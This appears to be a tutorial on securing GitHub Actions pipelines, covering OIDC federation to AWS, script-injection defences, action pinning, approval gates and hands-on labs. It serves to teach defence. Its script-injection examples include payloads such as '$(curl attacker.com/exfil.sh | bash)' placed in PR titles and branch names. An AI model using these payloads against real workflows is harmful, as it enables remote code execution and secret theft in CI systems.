OIDC + AWS — Authentication Without Static Credentials

The traditional way to authenticate GitHub Actions to AWS was to create an IAM user, generate an access key and secret, store them as GitHub secrets, and use them in every deployment job. This approach has serious problems: static credentials that never expire, credentials that get copy-pasted across repos, and a single compromised secret exposing your entire AWS environment.

OIDC federation eliminates all of this. GitHub acts as an identity provider. Your job requests a short-lived JWT from GitHub, presents it to AWS STS, and receives temporary credentials that expire in 15 minutes to 1 hour. No static keys. No long-lived secrets. The credentials are scoped to exactly the role you define.

🔐 How OIDC Works — Step by Step

1. Your workflow job starts and requests a JWT from GitHub's OIDC endpoint (requires id-token: write permission).

2. GitHub issues a signed JWT containing claims about the workflow: repo name, branch, environment, actor, and job SHA.

3. The configure-aws-credentials action presents this JWT to AWS STS using the AssumeRoleWithWebIdentity API.

4. AWS validates the JWT signature against GitHub's public JWKS endpoint, checks the trust policy conditions, and returns temporary credentials.

5. Your job uses those credentials for the rest of its execution. They expire automatically — no cleanup needed.

Setting Up the AWS Trust Policy

The trust policy on your IAM role is where you define exactly which GitHub Actions contexts are allowed to assume it. This is your security boundary — be specific.

aws-trust-policy.json — precise conditions
json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          // Must match your GitHub org/repo exactly
          "token.actions.githubusercontent.com:sub":
            "repo:my-org/iam-api:environment:production",
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        }
      }
    }
  ]
}
oidc-deploy.yml — complete OIDC workflow
yaml
name: Deploy with OIDC
on:
  push:
    branches: [main]

permissions:
  id-token: write        # REQUIRED — allows requesting OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # ← used in the trust policy sub claim

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy-prod
          role-session-name: github-deploy-${{ github.run_id }}
          aws-region: us-east-1
          role-duration-seconds: 900   # 15 min — minimum viable duration

      - name: Verify identity
        run: aws sts get-caller-identity

      - name: Deploy to ECS
        run: |
          aws ecs update-service \
            --cluster production \
            --service iam-api \
            --force-new-deployment
⚠️ Trust Policy Sub Claim — Be Specific

The sub claim in your trust policy controls which workflows can assume the role. Common patterns:

  • repo:org/repo:environment:production — only production environment deployments from that repo
  • repo:org/repo:ref:refs/heads/main — only pushes to main branch
  • repo:org/repo:* — any workflow in that repo (broader — use carefully)

Never use repo:org/* (all repos in org) unless you intend to allow every repo to assume that role. This is a common misconfiguration in early OIDC setups.

Workflow Security Hardening

GitHub Actions workflows are code that runs in your infrastructure. They are also a target. Supply chain attacks via compromised actions, script injection through PR titles, and over-permissioned tokens are the three most common attack vectors. Here is how to address each.

1 — Script Injection via Untrusted Input

Any time you embed a GitHub context value directly into a run: script, you risk script injection. A PR with a crafted title like ; curl attacker.com/steal.sh | bash # can execute arbitrary code if the title is interpolated into a shell command.

script-injection.yml — vulnerable vs safe patterns
yaml
# ❌ VULNERABLE — PR title injected directly into shell
- name: Post comment
  run: |
    echo "PR: ${{ github.event.pull_request.title }}" | gh issue comment

# ✅ SAFE — set as env var first, shell treats it as data not code
- name: Post comment safely
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR: $PR_TITLE" | gh issue comment

# Rule: NEVER use ${{ }} inside run: for user-controlled data.
# Set it as an env var and reference the env var in the shell.
# User-controlled: PR title, branch name, commit message, issue body, actor

2 — Third-Party Action Supply Chain

action-pinning.yml — SHA pinning with comment
yaml
steps:
  # ❌ Mutable tag — can be moved to malicious commit
  - uses: some-vendor/deploy-action@v3

  # ✅ Immutable SHA — cannot be changed retroactively
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0

  # For GitHub's own actions (lower supply chain risk) tags are acceptable
  # For third-party actions — always pin to SHA

3 — CODEOWNERS and Workflow Protection

In enterprise repositories, workflow files should not be modifiable by any engineer — they should be owned by the platform team and require a review from that team before changes merge.

.github/CODEOWNERS
text
# Platform team owns all workflow definitions
.github/workflows/     @my-org/platform-team
.github/actions/       @my-org/platform-team

# Application teams own their own code
src/                    @my-org/app-team
packages/               @my-org/app-team
🔒 Enterprise Security Checklist
  • All third-party actions pinned to full commit SHAs
  • Workflow-level permissions: read-all with job-level grants only
  • CODEOWNERS covering .github/workflows/ with platform team review required
  • User-controlled context values always set via env: before shell use
  • No pull_request_target trigger with checkout of PR code (high risk)
  • Branch protection rules requiring status checks before merge
  • OIDC for all cloud authentication — zero static credentials in secrets
  • Environment secrets for production — not repo-level secrets

Environments & Approval Gates — Controlled Promotions

GitHub Environments are named deployment targets (staging, production, etc.) that can have their own secrets, variables, and — most importantly — protection rules. A protection rule can require one or more specific reviewers to approve before a job can access that environment's secrets and start executing.

environments.yml — staging auto-deploy, production requires approval
yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging     # no protection rules — deploys automatically
    steps:
      - run: echo "Auto-deploying to staging"

  deploy-production:
    runs-on: ubuntu-latest
    needs: deploy-staging
    environment:
      name: production
      url: https://api.mycompany.com   # shown in the GitHub deployment UI
    # production has required reviewers configured in GitHub UI
    # This job PAUSES here and waits for an approved reviewer
    # before proceeding — even if CI passed
    steps:
      - run: echo "Deploying to production — reviewer approved"
🔐 PingFederate Migration — Environment Architecture

Set up three environments in GitHub:

  • dev: No protection rules. Any push to a feature branch can deploy here for testing. Uses dev AWS role with minimal permissions.
  • staging: Deploys automatically after CI passes on main. Smoke tests run automatically. No human approval needed — but only main branch can trigger it.
  • production: Requires approval from 2 members of the platform-team reviewer group. Has a 30-minute wait timer after approval before the job runs (gives time to abort if something looks wrong). Uses production OIDC role. PingFederate admin secrets only accessible here.

Debugging & Troubleshooting — Reading Pipelines Like a Pro

Every engineer working with GitHub Actions eventually faces a workflow that fails with an unhelpful error message, works locally but fails in CI, or passes CI but fails in production. Here is the systematic approach to diagnosing any pipeline failure.

Enable Debug Logging

GitHub Actions has two debug flags you can enable via repository secrets or variables. They are off by default because they produce significant log output.

debug-secrets.txt — set these in GitHub UI → Settings → Secrets
text
# Add these as repository secrets (value: true) to enable debug mode
ACTIONS_STEP_DEBUG = true
# Enables verbose step-level logging — shows every command and its output

ACTIONS_RUNNER_DEBUG = true
# Enables runner-level diagnostic logs — shows runner setup, communication
# Start with ACTIONS_STEP_DEBUG, add ACTIONS_RUNNER_DEBUG only if needed

Local Testing with act

act is an open-source tool that runs GitHub Actions workflows locally using Docker. It's invaluable for debugging without pushing commits to trigger runs.

act — local workflow testing
bash
# Install act (macOS)
brew install act

# Run the default push event
act push

# Run a specific job
act push -j build

# Run with a specific event payload
act pull_request -e event.json

# Pass secrets
act push --secret-file .secrets

# Use a specific platform image (smaller = faster)
act push -P ubuntu-latest=ghcr.io/catthehacker/ubuntu:act-latest

# Dry run — show what would execute without running it
act push --dryrun
💡 Add Debug Steps Temporarily

When a workflow behaves unexpectedly, add a debug step immediately before the failing step that prints all relevant context: echo '${{ toJson(github) }}' to see the full event, env to see all environment variables, and cat $GITHUB_OUTPUT to see what outputs have been set so far. Remove these steps before merging — they can expose sensitive values in logs.

💀 War Story — The Workflow That Passed Locally and Failed in CI

An engineer spent 3 hours debugging a workflow that ran perfectly with act but failed in GitHub with a cryptic exit code 128 on git commands. The issue: the workflow used git log to generate a changelog, which requires commit history. actions/checkout@v4 by default does a shallow clone with fetch-depth: 1 — only the latest commit. act was running against the local repo with full history. The fix was adding fetch-depth: 0 to the checkout step. Always check fetch-depth when workflows do anything git-history-related.

🐛 Spot the Bug #1 — OIDC Always Fails

A team sets up OIDC authentication. The AWS trust policy is correctly configured. The configure-aws-credentials action is correctly referenced. Every run fails with "Error: Credentials could not be loaded, please check your action inputs". What are the two things wrong?

name: Deploy
on:
  push: {branches: [main]}

permissions:
  contents: read
  # id-token not listed

jobs:
  deploy:
    runs-on: ubuntu-latest
    # no environment: key
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1

Two bugs:

Bug 1: id-token: write is missing from the permissions: block. This permission is required for GitHub to issue an OIDC token. Without it, the token request is silently blocked and the action receives nothing to exchange with AWS.

Bug 2: The trust policy uses repo:org/repo:environment:production as the sub claim condition — meaning it only allows workflows running in the production environment. But the job has no environment: key, so the sub claim is repo:org/repo:ref:refs/heads/main — which doesn't match. Fix both: add id-token: write to permissions and add environment: production to the job.

Deployment Status API — Tracking Deployments in GitHub

GitHub has a built-in Deployments API that lets you track what version of your code is deployed to which environment — visible in your repository's deployments page, in PR views, and accessible via the API. When you use the environment: key in your workflow, GitHub automatically creates deployment records. You can also update the status programmatically.

deployment-status.yml — full deployment lifecycle tracking
yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.mycompany.com   # appears as a link in the GitHub deployments UI
    permissions:
      deployments: write
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy service
        run: aws ecs update-service --cluster prod --service iam-api --force-new-deployment

      - name: Wait for service stability
        run: aws ecs wait services-stable --cluster prod --services iam-api
        timeout-minutes: 10

      # Summary visible in GitHub Actions run page
      - name: Write deployment summary
        if: always()
        run: |
          echo "## Deployment to Production" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "| --- | --- |" >> $GITHUB_STEP_SUMMARY
          echo "| **Status** | ${{ job.status }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Deployed by** | ${{ github.actor }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Commit** | ${{ github.sha }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Environment** | production |" >> $GITHUB_STEP_SUMMARY

Enterprise Design Patterns

At enterprise scale, individual workflow files are not the unit of design — the overall system is. Here are the patterns that mature CI/CD platforms use.

Pattern 1 — Workflow-as-a-Service

A central platform-workflows repository owned by the platform team. Service teams are consumers, not authors. They call shared workflows, not write their own. Standards, security, and compliance are enforced at the platform level. Services configure only what is specific to them.

workflow-as-a-service structure
text
platform-workflows/           # owned by platform-team
  .github/workflows/
    build-node.yml            # reusable: checkout, install, build, test
    deploy-ecs.yml            # reusable: OIDC auth, ECS deploy, smoke test
    release-npm.yml           # reusable: tag, publish, create release
    security-scan.yml         # reusable: Snyk, SAST, SBOM generation

iam-api/                      # owned by iam-team — only calls, never defines
  .github/workflows/
    ci.yml                    # calls platform-workflows/build-node.yml
    deploy.yml                # calls platform-workflows/deploy-ecs.yml

sso-service/                  # same pattern, different team
  .github/workflows/
    ci.yml                    # same call, different inputs
    deploy.yml

Pattern 2 — Monorepo Path Filtering

In a monorepo with multiple services, you only want to trigger the relevant service's pipeline when its files change — not run every service's pipeline on every commit.

monorepo-filtering.yml — per-service path triggers
yaml
# services/auth-api/.github/workflows/ci.yml
name: Auth API CI
on:
  push:
    branches: [main]
    paths:
      - 'services/auth-api/**'
      - 'packages/shared-lib/**'   # shared dep — also trigger on changes here
      - '.github/workflows/ci.yml'  # re-run if the workflow itself changes
  pull_request:
    branches: [main]
    paths:
      - 'services/auth-api/**'
      - 'packages/shared-lib/**'

defaults:
  run:
    working-directory: services/auth-api  # all run: steps execute from here

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test   # runs from services/auth-api/

Pattern 3 — Dynamic Matrix from Repository State

Instead of hardcoding matrix values, generate them dynamically from your repository — list changed services, detect affected packages, or query a config file. This is how large monorepos run only what changed.

dynamic-matrix.yml — detect changed services, run only those
yaml
jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.detect.outputs.services }}
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 2}
      - name: Detect changed services
        id: detect
        run: |
          SERVICES=$(git diff --name-only HEAD~1 HEAD \
            | grep '^services/' \
            | cut -d/ -f2 \
            | sort -u \
            | jq -R . | jq -sc .)
          echo "services=$SERVICES" >> $GITHUB_OUTPUT
          echo "Changed services: $SERVICES"

  build-changed:
    needs: detect-changes
    if: ${{ needs.detect-changes.outputs.services != '[]' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        service: ${{ fromJson(needs.detect-changes.outputs.services) }}
    defaults:
      run:
        working-directory: services/${{ matrix.service }}
    steps:
      - uses: actions/checkout@v4
      - run: echo "Building ${{ matrix.service }}"
      - run: npm ci && npm run build && npm test

Pattern 4 — Scheduled Maintenance Workflows

scheduled-maintenance.yml — nightly security and cleanup jobs
yaml
name: Nightly Maintenance
on:
  schedule:
    - cron: '0 2 * * *'        # 2am UTC every night
  workflow_dispatch:            # also allow manual trigger

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: {node-version: '20', cache: 'npm'}
      - run: npm ci
      - name: Audit dependencies
        run: npm audit --audit-level=high
        continue-on-error: true
      - name: Notify if vulnerabilities found
        if: failure()
        run: echo "High severity vulnerabilities found — notifying security team"

  stale-branch-report:
    runs-on: ubuntu-latest
    permissions: {contents: read}
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 0}
      - name: List branches older than 30 days
        run: |
          git for-each-ref --sort=committerdate refs/remotes/origin \
            --format='%(refname:short) %(committerdate:relative)' \
            | grep -v "HEAD\|main\|develop" >> $GITHUB_STEP_SUMMARY
🐛 Spot the Bug #2 — Dynamic Matrix Produces Empty Jobs

The detect-changes job correctly identifies two changed services and outputs services=["auth-api","iam-api"]. But the build-changed job either skips entirely or fails with "The matrix is empty". What is wrong?

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.detect.outputs.services }}
    steps:
      - id: detect
        run: echo "services=[\"auth-api\",\"iam-api\"]" >> $GITHUB_OUTPUT

  build-changed:
    needs: detect-changes
    runs-on: ubuntu-latest
    strategy:
      matrix:
        service: ${{ needs.detect-changes.outputs.services }}
    steps:
      - run: echo "Building ${{ matrix.service }}"

The bug: The matrix value needs to be parsed from a JSON string into an actual array using fromJson(). Without it, the matrix receives a raw string like "[\"auth-api\",\"iam-api\"]" rather than the array ["auth-api","iam-api"] — and GitHub can't expand a string into matrix jobs. Fix: Change the matrix definition to service: ${{ fromJson(needs.detect-changes.outputs.services) }}. This is required for any dynamic matrix generated from job outputs.

🐛 Spot the Bug #3 — Security Vulnerability via Script Injection

A workflow posts a comment on PRs with the branch name. A security researcher reports that by creating a PR from a branch named $(curl attacker.com/exfil.sh | bash) an attacker could execute arbitrary code in the workflow. Which line is the vulnerability?

on:
  pull_request:
    branches: [main]

jobs:
  comment:
    runs-on: ubuntu-latest
    permissions: {pull-requests: write}
    steps:
      - name: Post branch name to PR
        run: |
          gh pr comment ${{ github.event.number }} \
            --body "Branch: ${{ github.head_ref }}"

The vulnerability: ${{ github.head_ref }} is injected directly into the shell script. github.head_ref is the PR branch name — attacker-controlled. If the branch is named $(curl attacker.com | bash), the shell evaluates the $() command substitution and executes arbitrary code. Fix: Set it as an environment variable first: add env: HEAD_REF: ${{ github.head_ref }} to the step, then use $HEAD_REF in the shell. The shell treats env var values as data, not code — command substitution in a value assigned to an env var does not execute.

.github/workflows/deploy.yml — capstone production pipeline
yaml
name: Deploy IAM API

on:
  workflow_run:
    workflows: ["CI Pipeline"]
    types: [completed]
    branches: [main]

permissions: read-all

jobs:
  # ── 1: Build & Package ──────────────────────────────────────
  build:
    name: Build & Package
    runs-on: ubuntu-latest
    timeout-minutes: 15
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    permissions:
      contents: read
    outputs:
      version:   ${{ steps.meta.outputs.version }}
      short_sha: ${{ steps.meta.outputs.short_sha }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: {node-version: '20', cache: 'npm'}
      - run: npm ci && npm run build
      - id: meta
        run: |
          VERSION=$(node -p "require('./package.json').version")
          SHORT="${{ github.sha }}"
          echo "version=$VERSION" >> $GITHUB_OUTPUT
          echo "short_sha=${SHORT:0:8}" >> $GITHUB_OUTPUT
      - uses: actions/upload-artifact@v4
        with:
          name: dist-${{ github.sha }}
          path: dist/
          retention-days: 7
          if-no-files-found: error

  # ── 2: Integration Tests with Service Containers ─────────────
  integration-test:
    name: Integration Tests
    runs-on: ubuntu-latest
    timeout-minutes: 20
    needs: build
    services:
      postgres:
        image: postgres:16
        env: {POSTGRES_USER: test, POSTGRES_PASSWORD: test, POSTGRES_DB: testdb}
        ports: ['5432:5432']
        options: --health-cmd pg_isready --health-interval 10s --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: {node-version: '20', cache: 'npm'}
      - run: npm ci
      - run: npm run db:migrate
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
      - run: npm run test:integration
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: test-results, path: coverage/, if-no-files-found: warn}

  # ── 3: Deploy to Staging ─────────────────────────────────────
  deploy-staging:
    name: Deploy — Staging
    runs-on: ubuntu-latest
    timeout-minutes: 20
    needs: integration-test
    environment:
      name: staging
      url: https://staging-api.mycompany.com
    permissions: {id-token: write, contents: read, deployments: write}
    concurrency: {group: deploy-staging, cancel-in-progress: false}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: {name: dist-${{ github.sha }}, path: dist/}
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
      - run: |
          aws ecs update-service --cluster staging --service iam-api --force-new-deployment
          aws ecs wait services-stable --cluster staging --services iam-api
      - name: Notify — always
        if: always()
        env:
          STATUS: ${{ job.status }}
        run: echo "Staging deploy: $STATUS"

  # ── 4: Deploy to Production (requires approval) ──────────────
  deploy-prod:
    name: Deploy — Production
    runs-on: ubuntu-latest
    timeout-minutes: 30
    needs: deploy-staging
    environment:
      name: production
      url: https://api.mycompany.com
    permissions: {id-token: write, contents: read, deployments: write}
    concurrency: {group: deploy-production, cancel-in-progress: false}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: {name: dist-${{ github.sha }}, path: dist/}
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}  # prod env secret
          aws-region: us-east-1
      - name: Deploy to production ECS
        id: ecs-deploy
        run: |
          aws ecs update-service --cluster production --service iam-api --force-new-deployment
          aws ecs wait services-stable --cluster production --services iam-api
      - name: Rollback on failure
        if: ${{ failure() && steps.ecs-deploy.outcome == 'failure' }}
        run: echo "Deploy failed — triggering rollback"

  # ── 5: Always-run notification ───────────────────────────────
  notify:
    name: Notify
    runs-on: ubuntu-latest
    needs: [build, deploy-staging, deploy-prod]
    if: always()
    steps:
      - name: Write deployment audit summary
        run: |
          echo "## IAM API Deployment Report" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "| --- | --- |" >> $GITHUB_STEP_SUMMARY
          echo "| **Version** | ${{ needs.build.outputs.version }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **SHA** | ${{ needs.build.outputs.short_sha }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Triggered by** | ${{ github.actor }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Staging** | ${{ needs.deploy-staging.result }} |" >> $GITHUB_STEP_SUMMARY
          echo "| **Production** | ${{ needs.deploy-prod.result }} |" >> $GITHUB_STEP_SUMMARY
🧪 Lab 1 — Full OIDC Authentication Pipeline
Hands-On · ~60 min
Objective: Replace any static AWS credentials in your pipeline with OIDC federation. Set up the AWS trust policy, configure the GitHub environment, and verify the end-to-end flow with zero long-lived credentials.
  1. Create an IAM OIDC provider in AWS for token.actions.githubusercontent.com with audience sts.amazonaws.com. This only needs to be done once per AWS account.
  2. Create an IAM role with a trust policy using StringEquals conditions for both aud and sub. For the sub claim, use repo:YOUR-ORG/YOUR-REPO:environment:staging to scope it to your staging environment only.
  3. Create a staging environment in your GitHub repo (Settings → Environments → New). Store the IAM role ARN as an environment secret called AWS_ROLE_ARN.
  4. Add id-token: write to the permissions block of your deploy job — both at workflow level and job level. Verify you get an error without it, then fix it.
  5. Add the environment: staging key to your deploy job. Run the pipeline and verify the OIDC auth succeeds — check with aws sts get-caller-identity to confirm the role and session name.
  6. Verify the security boundary — temporarily change the trust policy sub to a non-matching value (e.g. different environment name). Run the pipeline and observe the 403 error from STS. Then restore the correct value. This confirms the trust policy is actually enforcing the constraint.
  7. Add a production environment with a required reviewer. Create a second IAM role scoped to environment:production. Trigger a run that reaches the production job and observe the approval gate pause in the GitHub UI.
🧪 Lab 2 — Diagnose and Fix a Broken Pipeline
Hands-On · ~45 min
Objective: Practice systematic debugging on a deliberately broken workflow. Each issue requires a different diagnostic approach — read the symptoms, form a hypothesis, find the evidence, fix it.
  1. Enable debug logging by setting ACTIONS_STEP_DEBUG = true as a repository secret. Run any workflow and observe the volume of additional output. Note where the extra detail appears in the step logs. Then remove the secret — you do not want this on permanently.
  2. Create a workflow with a silent skip — add a deploy job with if: github.ref == 'refs/heads/main' but trigger it from a feature branch. Observe the grey checkmark in the UI. Practice identifying when a job is skipped vs when it fails — they look different in the status view.
  3. Create a workflow with a scope mismatch — define a variable at job level in the build job, try to reference it in the deploy job. Observe the empty value. Add a debug step that prints all env vars and confirm the variable is not there. Fix it with workflow-level env.
  4. Create a workflow with the old output syntax — add a step using echo "::set-output name=key::value". Observe the warning (and potentially the failure) on GitHub-hosted runners. Replace with the correct $GITHUB_OUTPUT pattern and verify it works.
  5. Install act locally and run your pipeline against a local workflow file. Add a toJson(github) debug step and use act to print the full event context locally without burning GitHub Actions minutes. Compare the local context to the real GitHub context by running the same step in CI.
  6. Create a script injection scenario — write a workflow that uses ${{ github.head_ref }} directly in a run: command. Create a branch with a special-character name like test/branch-with-spaces and-special. Observe the shell error. Then fix it by setting the value as an env var and verify the branch name with special characters is now handled safely.
🧪 Lab 3 — Enterprise Patterns in Practice
Hands-On · ~60 min
Objective: Implement two enterprise patterns — workflow-as-a-service and dynamic matrix from repository state. These are the patterns that distinguish pipeline consumers from platform engineers.
  1. Create a platform workflow — extract your full build-test-deploy pipeline into a reusable workflow file with typed inputs for environment, service name, and Node version. This is your "platform workflow". Store it in a platform-workflows directory or repo.
  2. Create two caller workflows — one for your IAM API and one for a second (real or mock) service. Each should call the platform workflow with different inputs. Verify both work end to end. Observe that updating the platform workflow propagates to both callers.
  3. Add CODEOWNERS — create a .github/CODEOWNERS file that assigns .github/workflows/ to a platform team (use yourself as the team for this exercise). Attempt to merge a PR that modifies a workflow file without your own approval and observe the protection in action.
  4. Implement dynamic matrix — in a monorepo-style directory structure, create two service subdirectories. Write a detect-changes job that uses git diff to identify which service directories changed, outputs a JSON array, and feeds it into a matrix job. Test it by changing files in only one service and verifying only that service's job runs.
  5. Add a nightly scheduled workflow that runs npm audit on your project, outputs a report to $GITHUB_STEP_SUMMARY, and uses continue-on-error: true so vulnerabilities are flagged but don't block the job. Trigger it manually using workflow_dispatch to test without waiting for midnight.
  6. Pin all your third-party actions to SHAs — go through every workflow file and replace any mutable tag references (@v4) with the corresponding full commit SHA. Add a comment next to each one with the original tag name. This is the final security hardening step for production-grade workflows.
